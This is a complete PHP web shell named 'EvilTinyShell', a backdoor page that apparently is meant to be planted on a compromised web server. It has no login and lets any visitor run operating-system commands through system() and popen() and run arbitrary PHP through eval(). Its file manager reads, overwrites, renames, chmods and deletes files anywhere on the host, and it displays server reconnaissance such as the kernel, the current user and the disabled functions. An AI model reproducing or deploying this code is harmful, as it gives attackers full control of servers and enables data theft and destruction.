<?php
if(isset($_GET['d'])&&$_GET['d']=="phpinfo2")
{phpinfo();die;}
?>
<html>
<head>
<title>Tiny Shell</title>
</head>
<body>
<style>
.container {display:block;width:50%;}
.content {background:#E2E2E2;}
.round_span3 {background:#E2E2E2;display:block;line-height:1px;overflow:hidden;height:1px;margin:0 3px;}
.round_span2 {background:#E2E2E2;display:block;line-height:1px;overflow:hidden;height:1px;margin:0 2px;}
.round_span1 {background:#E2E2E2;display:block;line-height:1px;overflow:hidden;height:1px;margin:0 1px;}
</style>
<center><div class="container"><span class="round_span3"></span><span class="round_span2"></span><span class="round_span1"></span><div class="content">
<table width="100%" border="0" cellpadding="5" cellspacing="5">
<tr bgcolor="#E2E2E2"><td><div align="center">
  <h3><img src="data:image/png;base64,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" />EvilTinyShell</h3>
</div></td></tr>
<tr bgcolor="#EFEFEF">
  <td><table border="1" align="center" cellpadding="0" cellspacing="0" style="border-collapse: collapse;">
      <tr>
        <td><p align="right">Web server:</p></td>
        <td><div align="left"><b><?php echo getenv("SERVER_SOFTWARE"); ?></b></div></td>
      </tr>
      <tr>
        <td><div align="right">Kernel:</div></td>
        <td><div align="left"><b><?php echo php_uname(); ?></b></div></td>
      </tr>
      <tr>
        <td><div align="right">User:</div></td>
        <td><div align="left"><b><?php echo get_current_user(); ?></b></div></td>
      </tr>
      <tr>
        <td><div align="right">Safe-Mode:</div></td>
        <td><div align="left"><b><?php if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") echo ('ON'); else echo ('OFF'); ?></b></div></td>
      </tr>
      <tr>
        <td><div align="right">Disabled PHP Functions:</div></td>
        <td><div align="left"><b><?php if(''==($df=@ini_get('disable_functions')))echo 'NONE'; else echo '<br>'.str_replace(',', ', ', $df); ?></b></div></td>
      </tr>
      <tr>
        <td><div align="right">cURL:</div></td>
        <td><div align="left"><b><?php $curl_on = @function_exists('curl_version'); echo (($curl_on)?('ON'):('OFF')); ?></b></div></td>
      </tr>
      <tr>
        <td><div align="right">Your IP:</div></td>
        <td><div align="left"><b><?php echo $_SERVER['REMOTE_ADDR']; ?></b></div></td>
      </tr>
      <tr>
        <td><div align="right">Server IP:</div></td>
        <td><div align="left"><b><?php echo $_SERVER['HTTP_HOST'] . " / " . gethostbyname($_SERVER['HTTP_HOST']); ?></b></div></td>
      </tr>
    </table>    
    <table width="800" border="1" align="center" cellpadding="0" cellspacing="0" style="border-collapse: collapse;">
      <tr>
        <td width="157"><div align="center">
          <h4><a href="?d=file">File Manager</a></h4>
        </div></td>
        <td width="157"><div align="center">
          <h4><a href="?d=shell">Shell</a></h4>
        </div></td>
        <td width="157"><div align="center">
          <h4><a href="?d=code">PHP Code</a></h4>
        </div></td>
        <td width="157"><div align="center">
          <h4><a href="?d=phpinfo">PHP Info</a></h4>
        </div></td>
        </tr>
    </table>    
    <br />
    <p>
<?php

if(isset($_GET['d'])&&$_GET['d']!="")
{
	if($_GET['d']=="file")
	{
		if(isset($_GET['file'])&&$_GET['file']!="")
		{
			EditFile($_GET['file']);
		}
		elseif(isset($_GET['dir'])&&$_GET['dir']!="")
		{
			ListFiles($_GET['dir']);
		}
		else
		{ListFiles(base64_encode(dirname(__FILE__)));}
	}
	elseif($_GET['d']=="shell")
	{
		echo ('<center>');
		if(isset($_POST['c'])&&$_POST['c']!="")
		{
			echo ('<textarea rows="20" cols="100">');
			echo (htmlspecialchars(system($_POST['c'])));
			echo ('</textarea><br />');
		}
		echo ('<form method="POST" action="?d=shell"><input type="text" id="c" name="c" /><input type="submit" value="Run" /></form></center>');


		echo ('<center>');
		if(isset($_POST['c2'])&&$_POST['c2']!="")
		{
			if(PHP_OS == "WINNT" || PHP_OS == "WIN32")
			{
				pclose(popen("start /b ".$_POST['c2'], "r"));
			}
			else
			{
				pclose(popen($_POST['c2']." /dev/null &", "r"));
			}
			echo ('Successfully launched background process!<br />');
		}
		echo ('<form method="POST" action="?d=shell"><input type="text" id="c2" name="c2" /><input type="submit" value="Run Async" /></form></center>');
	}
	elseif($_GET['d']=="code")
	{
		echo ('<center>');
		if(isset($_POST['c'])&&$_POST['c']!="")
		{
			eval($_POST['c']);
		}
		echo ('<form method="POST" action="?d=code"><textarea rows="15" cols="80" id="c" name="c" /></textarea><br /><input type="submit" value="Run" /></form></center>');
	}
	elseif($_GET['d']=="phpinfo")
	{
		echo ('<iframe width="100%" height="1000px" src="?d=phpinfo2"></iframe>');
	}
}
else
	ListFiles(base64_encode(dirname(__FILE__)));

function EditFile($file)
{
	$file = base64_decode($file);
	echo ('<center>');
	if(isset($_GET['edit']))
	{
		if(isset($_POST['data']))
		{
			$fh = fopen($file, 'w');
			if ($fh)
			{
				fwrite($fh, $_POST['data']);
				fclose($fh);
			}
			else
			echo ('Can\'t open file!<br />');
		}
		echo ('<a href="?d=file&edit=true&file='.$_GET['file'].'">Edit</a> | <a href="?d=file&rename=true&file='.$_GET['file'].'">Rename</a> | <a href="?d=file&chmod=true&file='.$_GET['file'].'">Chmod</a> | <a href="?d=file&del=true&file='.$_GET['file'].'">Delete</a>');
		echo ('<br /><form method="POST" action="?d=file&edit=true&file='.$_GET['file'].'"><textarea rows="20" cols="100" name="data" id="data">');
		if(filesize($file)!=0)
		{
			$fh = fopen($file, 'r');
			$theData = fread($fh, filesize($file));
			fclose($fh);
			echo htmlspecialchars($theData);
		}
		echo ('</textarea><br /><input type="submit" value="save" /></form>');
	}
	elseif(isset($_GET['rename']))
	{	
		if(isset($_POST['name']))
		{
			$oldfile = $file;
			$file=str_replace(basename($file),$_POST['name'],$file);
			rename($oldfile, $file);
			echo ('Renamed!<br />');
		}
		echo ('<form method="POST" action="?d=file&rename=true&file='.$_GET['file'].'"><input size="50" id="name" name="name" type="text" value="'.basename(base64_decode($_GET['file'])).'" /><br /><input type="submit" value="Rename"></form>');
	}
	elseif(isset($_GET['chmod']))
	{
		if(isset($_POST['name']))
		{
			chmod($file, intval($_POST['name'], 8));
			echo ('File permissions changed!<br />');
		}
		echo ('<form method="POST" action="?d=file&chmod=true&file='.$_GET['file'].'"><input size="50" id="name" name="name" type="text" value="'.substr(decoct(fileperms(base64_decode($_GET['file']))), 3).'" /><br /><input type="submit" value="Rename"></form>');
	}
	elseif(isset($_GET['del']))
	{
		if(isset($_POST['yes']))
		{
			unlink(base64_decode($_GET['file']));
			echo ('Deleted!<br />');
		}
		echo ('<form method="POST" action="?d=file&del=true&file='.$_GET['file'].'">Are you sure?<br /><input name="yes" id="yes" type="submit" value="Yes"></form>');
	}
	else
	{
		echo ('<a href="?d=file&edit=true&file='.$_GET['file'].'">Edit</a> | <a href="?d=file&rename=true&file='.$_GET['file'].'">Rename</a> | <a href="?d=file&chmod=true&file='.$_GET['file'].'">Chmod</a> | <a href="?d=file&del=true&file='.$_GET['file'].'">Delete</a>');
		echo ('<br /><textarea rows="20" cols="100">');
		if(filesize($file)!=0)
		{
			$fh = fopen($file, 'r');
			$theData = fread($fh, filesize($file));
			fclose($fh);
			echo htmlspecialchars($theData);
		}
		echo ('</textarea>');
	}
	echo ('</center><br />');
}
function ListFiles($path)
{
	$dir = "";
	if(isset($_GET['dir'])&&$_GET['dir']!=""){$dir=realpath(base64_decode($_GET['dir']));}else{$dir=realpath(dirname(__FILE__));}
	
	echo ('<table width="800" border="1" align="center" cellpadding="0" cellspacing="0" style="border-collapse: collapse;">
      <tr>
        <td colspan="4"><a href="?d=file&dir='.base64_encode($dir).'">'.$dir.'</a> - '.view_perms_color($dir).'<br /><a href="?d=file">[Home]</a> <a href="?d=file&dir='.base64_encode(realpath($dir."/../")).'">[Up]</a> <a href="'.$_SERVER['REQUEST_URI'].'">[Refresh]</a> ');
		
	for ($ii=66;$ii<92;$ii++) 
	{
		$char = chr($ii);
		if (@opendir($char.":/"))
			echo '| <a href="?d=file&dir='.base64_encode($char.":\\").'">'.$char.":\\</a> ";
	}

	echo ('|</td>
      </tr>
	  <tr>
        <td><b>Name</b></td>
        <td><b>Size</b></td>
        <td><b>Modifyed</b></td>
        <td><b>Permissions</b></td>
      </tr>');
	  
	$path = base64_decode($path);
	if ($handle = opendir($path)) 
	{
		while (false !== ($file = readdir($handle))) 
		{
			if ($file != "." && $file != "..") 
			{
				echo ('<tr>
						<td width="157"><a href="?d=file&'); if(is_dir($path."/".$file))echo ('dir');else echo ('file'); echo ('='.base64_encode($path."/".$file).'">'.$file.'</a></td>
						<td width="157">'); if(!is_dir($path."/".$file)) echo round((filesize($path."/".$file))/1024,2).' KB'; else echo 'DIR'; echo ('</td>
						<td width="157">'.date('d.m.Y H:i:s',filemtime($path."/".$file)).'</td>
						<td width="157"><b>'.view_perms_color($path."/".$file).'</b></td>
					  </tr>');
			}
		}
		closedir($handle);
	}
	echo ('</table><br />');
}

function view_perms_color($o) 
{ 
	if (!is_readable($o)) {return "<font color=red>".view_perms(fileperms($o))."</font>";} 
	elseif (!is_writable($o)) {return "<font color=white>".view_perms(fileperms($o))."</font>";} 
	else {return "<font color=green>".view_perms(fileperms($o))."</font>";} 
} 
function view_perms($mode) 
{ 
	if (($mode & 0xC000) === 0xC000) {$type = "s";} 
	elseif (($mode & 0x4000) === 0x4000) {$type = "d";} 
	elseif (($mode & 0xA000) === 0xA000) {$type = "l";} 
	elseif (($mode & 0x8000) === 0x8000) {$type = "-";} 
	elseif (($mode & 0x6000) === 0x6000) {$type = "b";} 
	elseif (($mode & 0x2000) === 0x2000) {$type = "c";} 
	elseif (($mode & 0x1000) === 0x1000) {$type = "p";} 
	else {$type = "?";} 
	
	$owner["read"] = ($mode & 00400)?"r":"-"; 
	$owner["write"] = ($mode & 00200)?"w":"-"; 
	$owner["execute"] = ($mode & 00100)?"x":"-"; 
	$group["read"] = ($mode & 00040)?"r":"-"; 
	$group["write"] = ($mode & 00020)?"w":"-"; 
	$group["execute"] = ($mode & 00010)?"x":"-"; 
	$world["read"] = ($mode & 00004)?"r":"-"; 
	$world["write"] = ($mode & 00002)? "w":"-"; 
	$world["execute"] = ($mode & 00001)?"x":"-"; 
	
	if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";} 
	if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";} 
	if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";} 
	 
	return $type.join("",$owner).join("",$group).join("",$world); 
} 

?>
</p></td>
</tr>

<tr bgcolor="#E2E2E2"><td><div align="center"><h4><a href="http:// botsecurity.net">www.botsecurity.net</a></h4></div></td></tr>
</table>
</div><span class="round_span1"></span><span class="round_span2"></span><span class="round_span3"></span></div></center>
</body>
</html>